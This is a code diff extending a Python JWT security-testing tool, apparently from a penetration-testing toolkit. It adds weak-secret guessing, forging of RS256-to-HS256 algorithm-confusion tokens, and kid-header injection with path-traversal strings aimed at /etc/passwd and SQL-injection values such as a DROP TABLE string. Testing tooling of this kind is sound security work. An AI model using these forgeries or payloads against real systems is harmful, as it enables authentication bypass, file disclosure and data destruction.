@@ -6,7 +6,8 @@ import base64
 import json
 import hmac
 import hashlib
-from typing import Dict, Optional
+from datetime import datetime, timezone
+from typing import Dict, List, Optional
 
 from ..base import ToolResult
 
@@ -53,6 +54,10 @@ class JWTTool:
         new_payload: str = "",
         resign: str = "false",
         none_attack: str = "false",
+        check_weak_secrets: str = "true",
+        algorithm_confusion: str = "false",
+        kid_injection: str = "false",
+        analyze_expiration: str = "true",
     ) -> ToolResult:
         token = token.strip()
         if not token:
@@ -64,8 +69,20 @@ class JWTTool:
 
         lines = ["Decoded header:", json.dumps(header, indent=2), "", "Decoded payload:", json.dumps(payload, indent=2)]
 
+        # Analyze token expiration
+        if analyze_expiration.strip().lower() in {"1", "true", "yes", "on"}:
+            exp_analysis = self._analyze_expiration(payload)
+            if exp_analysis:
+                lines.extend(["", "Token Expiration Analysis:", *exp_analysis])
+
         chosen_alg = override_alg.strip().upper() or header.get("alg", "")
         verify_flag = verify.strip().lower() in {"1", "true", "yes", "on"}
+
+        # Check for weak secrets
+        if check_weak_secrets.strip().lower() in {"1", "true", "yes", "on"}:
+            weak_secrets = self._check_weak_secrets(header_b64, payload_b64, signature_b64, chosen_alg)
+            if weak_secrets:
+                lines.extend(["", "Weak Secret Detection:", *weak_secrets])
 
         if verify_flag and chosen_alg:
             verification_lines = self._verify_signature(
@@ -111,6 +128,20 @@ class JWTTool:
                 "None-alg token (signature stripped):",
                 token_none,
             ])
+
+        # Algorithm confusion attack
+        if algorithm_confusion.strip().lower() in {"1", "true", "yes", "on"}:
+            confusion_attempts = self._attempt_algorithm_confusion(
+                header_b64, payload_b64, signature_b64, public_key
+            )
+            if confusion_attempts:
+                lines.extend(["", "Algorithm Confusion Attempts:", *confusion_attempts])
+
+        # Kid injection attack
+        if kid_injection.strip().lower() in {"1", "true", "yes", "on"}:
+            kid_attempts = self._attempt_kid_injection(header_b64, payload_b64, signature_b64)
+            if kid_attempts:
+                lines.extend(["", "Kid Injection Attempts:", *kid_attempts])
 
         if resign.strip().lower() in {"1", "true", "yes", "on"}:
             alg = signing_header.get("alg", chosen_alg)
@@ -193,6 +224,176 @@ class JWTTool:
             signature_segment = _b64url_encode(signature)
             return ["Re-signed token:", f"{header_segment}.{payload_segment}.{signature_segment}"]
         return [f"Algorithm {alg} not supported for signing."]
+
+    def _check_weak_secrets(
+        self, header_b64: str, payload_b64: str, signature_b64: str, alg: str
+    ) -> List[str]:
+        """Check for common weak secrets."""
+        if alg not in _HMAC_ALGS:
+            return []
+        
+        signing_input = f"{header_b64}.{payload_b64}".encode()
+        weak_secrets = [
+            "", "secret", "Secret", "SECRET",
+            "password", "Password", "PASSWORD",
+            "123456", "admin", "Admin", "ADMIN",
+            "key", "Key", "KEY", "test", "Test",
+            "jwt", "JWT", "token", "Token",
+            "changeme", "default", "None", "none",
+        ]
+        
+        results: List[str] = []
+        for weak_secret in weak_secrets:
+            try:
+                digest = hmac.new(weak_secret.encode(), signing_input, _HMAC_ALGS[alg]).digest()
+                expected = _b64url_encode(digest)
+                if _constant_time_equals(expected, signature_b64):
+                    results.append(f"✓ Weak secret found: {repr(weak_secret)}")
+                    break
+            except Exception:
+                continue
+        
+        if not results:
+            results.append("No common weak secrets matched.")
+        
+        return results
+
+    def _attempt_algorithm_confusion(
+        self, header_b64: str, payload_b64: str, signature_b64: str, public_key: str
+    ) -> List[str]:
+        """Attempt algorithm confusion attack (RS256 -> HS256)."""
+        results: List[str] = []
+        
+        if not public_key.strip():
+            return ["Algorithm confusion skipped: no public key provided"]
+        
+        # Try converting RS256 to HS256 using public key as secret
+        try:
+            signing_input = f"{header_b64}.{payload_b64}".encode()
+            
+            # Create HS256 header
+            header = self._decode_segment(header_b64)
+            hs256_header = header.copy()
+            hs256_header["alg"] = "HS256"
+            hs256_header_b64 = _b64url_encode(json.dumps(hs256_header, separators=(",", ":")).encode())
+            
+            # Sign with public key as secret (algorithm confusion)
+            pub_key_bytes = public_key.encode()
+            digest = hmac.new(pub_key_bytes, signing_input, _HMAC_ALGS["HS256"]).digest()
+            new_signature = _b64url_encode(digest)
+            
+            confused_token = f"{hs256_header_b64}.{payload_b64}.{new_signature}"
+            results.append("Algorithm confusion token (RS256 -> HS256):")
+            results.append(confused_token)
+        except Exception as exc:
+            results.append(f"Algorithm confusion attempt failed: {exc}")
+        
+        return results
+
+    def _attempt_kid_injection(
+        self, header_b64: str, payload_b64: str, signature_b64: str
+    ) -> List[str]:
+        """Attempt kid (Key ID) injection attacks."""
+        results: List[str] = []
+        
+        header = self._decode_segment(header_b64)
+        signing_input = f"{header_b64}.{payload_b64}".encode()
+        
+        # Kid path traversal attempts
+        kid_injections = [
+            "../../../../etc/passwd",
+            "....//....//....//etc/passwd",
+            "....\\\\....\\\\....\\\\windows\\system32\\drivers\\etc\\hosts",
+        ]
+        
+        for kid_value in kid_injections:
+            try:
+                # Create header with injected kid
+                new_header = header.copy()
+                new_header["kid"] = kid_value
+                new_header_b64 = _b64url_encode(json.dumps(new_header, separators=(",", ":")).encode())
+                
+                # Note: This is just showing the tampered header
+                # Actual signature would need to be recalculated
+                tampered_token = f"{new_header_b64}.{payload_b64}.{signature_b64}"
+                results.append(f"Kid injection attempt: {kid_value}")
+                results.append(tampered_token)
+            except Exception:
+                continue
+        
+        # SQL injection in kid
+        sql_kid_values = [
+            "'; DROP TABLE users; --",
+            "1' OR '1'='1",
+        ]
+        
+        for sql_kid in sql_kid_values:
+            try:
+                new_header = header.copy()
+                new_header["kid"] = sql_kid
+                new_header_b64 = _b64url_encode(json.dumps(new_header, separators=(",", ":")).encode())
+                tampered_token = f"{new_header_b64}.{payload_b64}.{signature_b64}"
+                results.append(f"Kid SQL injection attempt: {sql_kid}")
+                results.append(tampered_token)
+            except Exception:
+                continue
+        
+        if not results:
+            results.append("No kid injection vulnerabilities detected in header.")
+        
+        return results
+
+    def _analyze_expiration(self, payload: Dict[str, object]) -> List[str]:
+        """Analyze token expiration claims."""
+        results: List[str] = []
+        
+        now = datetime.now(timezone.utc)
+        now_timestamp = int(now.timestamp())
+        
+        # Check exp (expiration time)
+        exp = payload.get("exp")
+        if exp:
+            try:
+                exp_int = int(exp) if isinstance(exp, (int, float, str)) else None
+                if exp_int:
+                    exp_dt = datetime.fromtimestamp(exp_int, tz=timezone.utc)
+                    if exp_int < now_timestamp:
+                        results.append(f"⚠ Token EXPIRED at {exp_dt.isoformat()}")
+                    else:
+                        remaining = exp_int - now_timestamp
+                        results.append(f"✓ Token expires at {exp_dt.isoformat()} ({remaining}s remaining)")
+            except (ValueError, TypeError, OSError):
+                results.append(f"Invalid exp claim: {exp}")
+        
+        # Check nbf (not before)
+        nbf = payload.get("nbf")
+        if nbf:
+            try:
+                nbf_int = int(nbf) if isinstance(nbf, (int, float, str)) else None
+                if nbf_int:
+                    nbf_dt = datetime.fromtimestamp(nbf_int, tz=timezone.utc)
+                    if nbf_int > now_timestamp:
+                        results.append(f"⚠ Token not valid before {nbf_dt.isoformat()}")
+                    else:
+                        results.append(f"✓ Token valid from {nbf_dt.isoformat()}")
+            except (ValueError, TypeError, OSError):
+                results.append(f"Invalid nbf claim: {nbf}")
+        
+        # Check iat (issued at)
+        iat = payload.get("iat")
+        if iat:
+            try:
+                iat_int = int(iat) if isinstance(iat, (int, float, str)) else None
+                if iat_int:
+                    iat_dt = datetime.fromtimestamp(iat_int, tz=timezone.utc)
+                    results.append(f"Token issued at {iat_dt.isoformat()}")
+            except (ValueError, TypeError, OSError):
+                results.append(f"Invalid iat claim: {iat}")
+        
+        if not results:
+            results.append("No expiration claims (exp, nbf, iat) found in token.")
+        
+        return results
 
 
 def _split_token(token: str) -> tuple[str, str, str]:
